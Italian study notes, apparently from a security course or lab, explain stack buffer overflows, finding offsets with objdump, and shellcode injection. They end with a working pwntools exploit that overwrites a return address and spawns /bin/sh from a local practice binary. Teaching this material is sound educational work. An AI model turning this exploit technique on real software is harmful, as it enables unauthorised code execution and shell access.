MEMORY CORRUPTION
attaccante modifica celle di memoria per modificare comportamento di un programma, con ad esempio buffer overflow
buffer overflow: su array puntatori e stringhe, permettono l'accesso a dati al di fuori dai limiti dell'array 
si può copiare una stringa più lunga di quella che è stata allocata
si possono modificare i puntatori per referenziare locazioni errate
posso modificare return address nello stack trace, quindi al termine di una funzione eseguo codice che voglio io e non la funzione chiamante
ad esempio se eseguo strcpy di argv[1] in una variabile che contiene 10 caratteri, se in argv[1] metto 100 caratteri copio i primi 10 e gli altri sovrascrivono altre aree di memoria
devo provare a inviare input sempre più grandi e vedo quando cambia il valore della variabile (se nell'input invio delle a ad esempio vedo se compare 42 cioè il suo valore ascii)
devo stare attento a little e big endian della variabile per vedere quali byte mettere prima
come forzare esecuzione funzione: 
	objdump -d return -> disassembla file binario
	mi mostra in output per ogni funzione il suoo indirizzo
	vedo anche dove è sono allocate le variabili e quanto occupano ($0x28,%esp 28 byte in esadecimale quindi 49 in decimale)
	vedo l'indirizzo di ebp e verifico quanto distante è il buffer da ebp e quanto occupa il return address 
	-0x1c(%ebp),%eax -> bufer 1c cioè 28 byte prima di ebp, se dichiarato di 20 byte ne occupa comunque 28
	ora so che ci sono 28 byte per buffer, poi 4 per ebp e poi c'è il return address (per la struttura dei file elf classica quando sono caricati in memoria)
	invio con python con una print dei caratteri a caso per la dimensione del buffer e lo spazio dal buffer ll'ebp e poi invio l'indirizzo della funzione da chiamare

SHELLCODE INJECTION
inietto un payload con system call che invoca terminale presente in /bin/sh
per effttuarlo l'attaccante sovrascrive registro eip per riferire un'area di memoria da lui controllata
in questa area mette istruzioni che creano una shell
l'ordine delle operazioni da fare è:
	verificare se si può effettuare buffer overflow
		uso cyclic numbyte | ./eseguibile -> inietta un input lungo
		dsmeg | tail -n 2 -> info su errore che ha causato l'interruzione del programma (esempio core dump se vado oltre limiti di memoria)
	iniettare codice shell nello stack
	identificare l'indirizzo a cui saltare

from pwn import *

exe = ELF('shellcode')
context.binary = exe

payload = b'a'*32
payload += p32(0x8049267)
payload += asm(shellcraft.sh())

p = process('./shellcode')
p.sendlineafter(b'name: ',payload)

print(p.clean())
p.interactive()
